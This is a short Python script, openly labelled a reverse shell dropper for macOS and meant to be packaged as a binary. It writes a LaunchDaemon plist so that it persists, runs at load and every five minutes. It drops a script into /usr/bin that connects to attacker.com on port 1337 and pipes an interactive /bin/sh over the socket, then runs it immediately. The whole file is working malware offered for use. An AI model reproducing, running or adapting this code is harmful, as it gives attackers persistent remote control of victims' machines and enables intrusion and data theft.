# A much less convoluted reverse shell dropper
# Intended to be made into a binary wirh py2app or similar

plist = '''\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.osxsvct.plist</string>
    <key>ProgramArguments</key>
    <array>
        <string>python</string>
        <string>/usr/bin/osxsvct.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
'''

osxsvct_py = '''
def spawn(h,p):
	import socket,subprocess,os
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((h,p))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])
spawn(h="attacker.com",p=1337)
'''

with open("/usr/bin/com.osxsvct.plist","a") as f:
	f.write(plist)

with open("/System/Library/LaunchDaemons/com.osxsvct.plist","a") as f:
	f.write(plist)
	
with open("/usr/bin/osxsvct.py","a") as f:
	f.write(osxsvct_py)

import sys
sys.path.append("/usr/bin")

import osxsvct

osxsvct.spawn(h="attacker.com",p=1337)
